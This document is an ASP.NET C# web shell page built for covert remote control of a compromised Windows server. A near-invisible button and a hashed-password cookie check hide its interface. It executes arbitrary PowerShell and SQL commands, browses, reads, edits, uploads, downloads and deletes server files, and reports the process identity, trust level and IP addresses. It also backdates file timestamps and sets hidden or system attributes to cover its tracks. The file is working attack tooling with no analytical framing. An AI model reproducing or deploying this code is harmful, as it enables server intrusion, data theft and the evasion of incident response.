<%@ Page Language="C#" Debug="false" Trace="false" ValidateRequest="false" EnableViewStateMac="false" EnableTheming = "False" StylesheetTheme="" Theme=""%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Collections.Generic"%>
<%@ import Namespace="System.Net" %>
<%@ Import Namespace="System.Collections.ObjectModel"%>
<%@ Import Namespace="System.Management.Automation"%>
<%@ Import Namespace="System.Management.Automation.Runspaces"%>
<%@ Assembly Name="System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35"%>
<%@ import Namespace="System.Web.UI"%>
<%@ import Namespace="System.Web"%>
<%@ import Namespace="System.Data"%>
<%@ Import namespace="System.Data.SqlClient"%>
<%@ import Namespace="System.Security"%>

<script runat="server">

    protected void Page_Load(object sender, EventArgs e)
    {
        load();

    }

    //< Microsoft_BTNs >

    protected void pre_Click(object sender, EventArgs e)
    {
        UnicodeEncoding ByteConverter = new UnicodeEncoding();
        byte[] dataToEncrypt = ByteConverter.GetBytes(Pre_inp.Value);

        System.Security.Cryptography.SHA1 hash = new System.Security.Cryptography.SHA1CryptoServiceProvider();
        byte[] HKOUD = hash.ComputeHash(dataToEncrypt);
        string hs = BitConverter.ToString(HKOUD).Replace("-", "");
        string ASPNET_Request_ID = "";
        for (int i = 0; i < HKOUD.Length; i++)
        { ASPNET_Request_ID = ASPNET_Request_ID + HKOUD.GetValue(i).ToString(); }

        if (ASPNET_Request_ID == "22521823415014022855269613086100616819160537315184" )
        {Response.Cookies.Add(new HttpCookie("Cookies","ASP.NET")); load(); }
        else { }
    }

    protected void gopth(object sender, EventArgs e)
    {   string red = (sender as LinkButton).CommandArgument;
        try { pth_builder(red + "\\");} catch { rw_all(red); }
    }

    protected void go_Click(object sender, EventArgs e)
    {rw_all(input_pth.Value);}

    protected void go0_Click(object sender, EventArgs e)
    {pth_builder(Directory.GetParent(input_pth.Value).FullName);}

    protected void CC_Click(object sender, EventArgs e)
    {
        if (CheckBoxQ.Checked) { SQL(); } else { use0.Text = P(CC.Value); Literal1.Text = ""; }
    }

    protected void UPF(object sender, EventArgs e)
    {
        string fileName = Path.GetFileName(FUP1.PostedFile.FileName);
        FUP1.PostedFile.SaveAs(input_pth.Value + "//"+ fileName);
        pth_builder(input_pth.Value);
    }

    protected void DF(object sender, EventArgs e)
    {
        string paso = (sender as LinkButton).CommandArgument;
        Response.ContentType = ContentType;
        Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(paso));
        Response.WriteFile(paso);
        Response.End();
        pth_builder(input_pth.Value);
    }

    protected void del(object sender, EventArgs e)
    {
        string paso = (sender as LinkButton).CommandArgument;
        try { File.Delete(paso); } catch{ Directory.Delete(paso);};
        pth_builder(input_pth.Value);
    }

    protected void Dater_Click(object sender, EventArgs e)
    {
        Dater_all(pth_dat.Value, inputo.Value);
       
        if (H.Checked)  { try { File.SetAttributes(pth_dat.Value, File.GetAttributes(pth_dat.Value)| FileAttributes.Hidden); } catch {}  }
        if (S.Checked)  { try { File.SetAttributes(pth_dat.Value, File.GetAttributes(pth_dat.Value)| FileAttributes.System); } catch {}  }
        if (R.Checked)  { try { File.SetAttributes(pth_dat.Value, File.GetAttributes(pth_dat.Value)| FileAttributes.ReadOnly); } catch {}  }
        pth_builder(input_pth.Value);
    }

    protected void read(object sender, EventArgs e)
    { string red = (sender as LinkButton).CommandArgument; rw_all(red);  }

    protected void bsave_Click(object sender, EventArgs e)
    {
        rw.Visible = true;
        StreamWriter sw = new StreamWriter(input_pth.Value.TrimEnd('\\'), false, System.Text.Encoding.UTF8);
        sw.Write(TextArea1.InnerText);
        sw.Close();
        Dater_all(input_pth.Value.TrimEnd('\\'), inputo0.Value);
    }

    ///////////////

    private bool Check()
    {
        if(Request.Cookies["Cookies"]==null)
        {Pre.Visible = true; return false;}

        else
        {
            if (Request.Cookies["Cookies"].Value != "ASP.NET")
            {Pre.Visible = true; return false; }
            else { return true; }
        }
    }

    protected void load()
    {
        Main.Visible = true; Pre.Visible = false;
        if (input_pth.Value == "") { input_pth.Value = Page.MapPath("."); }
        string POOL=""; string SIT=""; string NET="";
        try { POOL = System.Environment.GetEnvironmentVariable("APP_POOL_ID", EnvironmentVariableTarget.Process); } catch { }
        //try { SIT = System.Web.Hosting.HostingEnvironment.ApplicationHost.GetSiteName(); } catch {};
        try { NET = System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory(); } catch { }
        use0.Text = "lvl:" + tlvl() + "  || UD:" + U() +  "\r\n \r\nPool: " +  POOL + "  ||  NET: " + NET + " || SIT:" + SIT + "\r\n" ;
        I_P();
    }

    protected void rw_all(string rw_any)
    {
        GV.Visible = false;
        rw.Visible = true;
        try {
            inputo0.Value = File.GetLastWriteTime(rw_any).ToString();
            input_pth.Value = rw_any;
            StreamReader sr = new StreamReader(rw_any, System.Text.Encoding.UTF8, true);
            String line = sr.ReadToEnd();
            TextArea1.InnerText = line;
            sr.Close();
        }catch { pth_builder(rw_any); }
    }

    protected void pth_builder(string pox)
    {

        rw.Visible = false;
        GV.Visible = true;
        //if (!pox.EndsWith("\\")) { pox = pox + "\\"; }

        string[] pasosD = Directory.GetDirectories(pox);
        string[] pasos = Directory.GetFiles(pox);

        DataTable table = new DataTable();
        table.Columns.Add("N", typeof(string));
        table.Columns.Add("D", typeof(string));

        foreach (string paso in pasosD)
        {
            DateTime modification = File.GetLastWriteTime(paso);
            table.Rows.Add(new ListItem(Path.GetFullPath(paso), paso), new ListItem(modification.ToString()));
        }

        foreach (string paso in pasos)
        {
            DateTime modification = File.GetLastWriteTime(paso);
            table.Rows.Add(new ListItem(Path.GetFullPath(paso), paso), new ListItem(modification.ToString()));
        }

        GV.DataSource = table;
        GV.DataBind();
        input_pth.Value = pox.TrimEnd('\\');
    }

    private string tlvl()
    {
        try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Unrestricted).Demand();return "Full";}catch{}
        try{new AspNetHostingPermission(AspNetHostingPermissionLevel.High).Demand();return "High";}catch{}
        try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Medium).Demand();return "Medium";}catch{}
        try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Low).Demand();return "Low";}catch{}
        try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Minimal).Demand();return "Minimal";}catch{}
        try{new AspNetHostingPermission(AspNetHostingPermissionLevel.None).Demand();return "None";}catch{}
        return "Unknown";
    }

    private string U()
    {try{return System.Security.Principal.WindowsIdentity.GetCurrent().Name;}catch{return "Unknown";}}

    protected void Dater_all(string d_pth, string d_d)
    {
        try {
            File.SetLastWriteTimeUtc(d_pth,Convert.ToDateTime(d_d));
            File.SetCreationTimeUtc(d_pth,Convert.ToDateTime(d_d));
            File.SetLastAccessTimeUtc(d_pth,Convert.ToDateTime(d_d));
        }catch
        {
            if (!d_pth.EndsWith("\\")) { d_pth = d_pth + "\\"; }
            Directory.SetLastWriteTimeUtc(d_pth,Convert.ToDateTime(d_d));
            Directory.SetCreationTimeUtc(d_pth,Convert.ToDateTime(d_d));
            Directory.SetLastAccessTimeUtc(d_pth,Convert.ToDateTime(d_d));
        }
    }

    private static string P(string S)
    {
        try
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(S);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
                stringBuilder.AppendLine(obj.ToString());
            return stringBuilder.ToString();
        }catch(Exception exception) {return string.Format("Error: {0}", exception.Message);
        }
    }

    protected void I_P()
    {
        try {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (IPAddress ip in host.AddressList)
            {localIP = localIP + " || " + ip;}
            use0.Text = use0.Text + "\r\n"+ "H: " + Dns.GetHostName() + localIP; } catch { }
    }

    protected void SQL()
    {
        SqlConnection sqlConnection = null;

        try
        {
            sqlConnection = new SqlConnection();
            sqlConnection.ConnectionString = QString.Value;
            sqlConnection.Open();

            SqlCommand sqlCommand = new SqlCommand(CC.Value, sqlConnection);
            SqlDataReader reader = sqlCommand.ExecuteReader();
            StringBuilder output = new StringBuilder();
            output.Append("<table width=\"100%\" style=\"border: #0099CC solid;\" border = \"1\">");

            while (reader.Read())
            {
                output.Append("<tr>");
                int colCount = reader.FieldCount;

                for (int index = 0; index < colCount; index++)
                {
                    output.Append("<td>");
                    output.Append(reader[index].ToString());
                    output.Append("</td>");
                }
                output.Append("</tr>");
                output.Append(Environment.NewLine);
            }

            output.Append("</table>");
            Literal1.Text = output.ToString();
        }
        catch (SqlException sqlEx) {Literal1.Text = sqlEx.ToString();}
        catch (Exception ex) {Literal1.Text = ex.ToString();}
        finally  { if (sqlConnection != null)   {sqlConnection.Dispose();} }
    }


</script>
<html>
<head runat="server">
    <title></title>
    <style type="text/css">
        *{font-family:'Courier New';}
        tr.row:hover td, tr.row.over td{ background-color: #ffff99;}
        .header {display:none;}
        .auto-style1 {
            height: 30px;
            width: 639px;
        }
     </style>
</head>
<body>
    <form id="Form" runat="server">
        <Center>
          <div id="Pre" runat="server">
          <input type="hidden" id="Pre_inp" value="ASP" runat="server">
          <asp:Button ID="Pre_btn" runat="server" OnClick="pre_Click" Width="60px" Height="16px" BackColor="#ffffff" ForeColor="White" BorderStyle="None" />
          </div>

    <div id="Main" runat="server" visible ="false">
        <asp:TextBox ID="use0" runat="server" Width="1024px" Font-Size="17px" ForeColor="#FF0066" BorderColor="#0099CC" BorderStyle="Solid" BorderWidth="4px" ReadOnly="True" TextMode="MultiLine" Height="193px"></asp:TextBox>
        <br/><br/>
        <input id="QString" type="text" runat="server" style="border: #0099CC solid; color: #FF0066; height: 30px; width: 52px; font-size:16px;font-weight: bold;"/>
        <asp:CheckBox ID="CheckBoxQ" runat="server" Text="SQL" /> &nbsp;<input id="CC" type="text" runat="server" style="border: #0099CC solid; color: #FF0066; height: 30px; font-size:16px;font-weight: bold; width: 714px;"/>
        <asp:Button ID="CC_GO" runat="server" OnClick="CC_Click" Text="GO" Width="161px" Height="30px" BackColor="#666666" ForeColor="White" /> 
        <br/><br/>
        <asp:Literal ID="Literal1" runat="server"> </asp:Literal>
        <br/>
        
        <input id="pth_dat" type="text" runat="server" style="border: #0099CC solid; color: #FF0066; font-size:16px;font-weight: bold;" class="auto-style1"/>
        <asp:CheckBox ID="S" runat="server" Text="S" />
        <asp:CheckBox ID="H" runat="server" Text="H" />
        <asp:CheckBox ID="R" runat="server" Text="R" />
        &nbsp;<asp:Button ID="Dater" runat="server" OnClick="Dater_Click" Text="D" Width="69px" BackColor="#666666" ForeColor="White" Height="30px" />
        <input id="inputo" type="text" runat="server" value="9/13/2015 7:07:22 PM" style="height:30px"/><br />
        &nbsp;<br/>
        <input id="input_pth" type="text" runat="server" style="border: #0099CC solid; color: #FF0066; height: 30px; width:1024px; font-size:16px;font-weight: bold;"/><br/>
        <br/>
        <asp:Button ID="go0" runat="server" OnClick="go0_Click" Text="go_up" Width="161px" Height="20px" BackColor="#666666" ForeColor="White" /> &nbsp;
        <asp:Button ID="go" runat="server" OnClick="go_Click" Text="go" Width="161px" Height="20px" BackColor="#666666" ForeColor="White" />
    <asp:FileUpload ID="FUP1" runat="server" Height="22px" Width="400px" />
    <asp:Button ID="btnUpload" runat="server" Text="yeb" OnClick="UPF" Height="23px" Width="95px" BackColor="#666666" ForeColor="White" />
        <br />
    <hr style="height: -12px" />
    <asp:GridView ID="GV" runat="server" CssClass="GV" AutoGenerateColumns="False" Width="1024px" BackColor="White" BorderColor="#0099CC" BorderWidth="3px" BorderStyle="Solid" CellPadding="3" GridLines="Horizontal" EnableModelValidation="True">
          <Columns>
            <asp:TemplateField HeaderText="N" >
                <ItemTemplate>
                    <asp:LinkButton ID="Label1" runat="server" Text='<%# Bind("N") %>' CommandArgument = '<%# Eval("N") %>' OnClick = "gopth" ForeColor="#24252a" style="text-decoration: none;"></asp:LinkButton>
                </ItemTemplate>
            </asp:TemplateField>

              <asp:BoundField HeaderText="D" DataField="D" />

            <asp:TemplateField>
                <ItemTemplate>
                    <asp:LinkButton ID="lnkDownload" Text = "Dn" CommandArgument = '<%# Eval("N") %>' runat="server" OnClick = "DF" ForeColor="#FF0066"></asp:LinkButton>
                </ItemTemplate>
            </asp:TemplateField>
            <asp:TemplateField>
                <ItemTemplate>
                    <asp:LinkButton ID = "lnkDelete" Text = "del" CommandArgument = '<%# Eval("N") %>' runat = "server" OnClick = "del"/>
                </ItemTemplate>
            </asp:TemplateField>
          <asp:TemplateField>
                <ItemTemplate>
                    <asp:LinkButton ID = "lnkRead" Text = "Vw" CommandArgument = '<%# Eval("N") %>' runat = "server" OnClick = "read" ForeColor="Black"/>
                </ItemTemplate>
            </asp:TemplateField>

        </Columns>
        <AlternatingRowStyle BackColor="#f2f2f2" />
        <RowStyle BackColor="#ffffff" CssClass="row"/>
        <HeaderStyle BackColor="#34495e" CssClass="header"/>
        
    </asp:GridView>
        <br/>
        <div id="rw" runat="server" visible="false">
        <textarea id="TextArea1" name="S1" runat="server" style="height: 415px; width: 1024px;"></textarea>
            <br/> <br/>
            <asp:Button ID="bsave" runat="server" OnClick="bsave_Click" Text="save" Width="64px" BackColor="#666666" ForeColor="White" Height="30px" />
            &nbsp;<input id="inputo0" type="text" runat="server" style="color: #FF0066" /></div>
            </div>
        </Center>
        </form>
        
</body>
</html>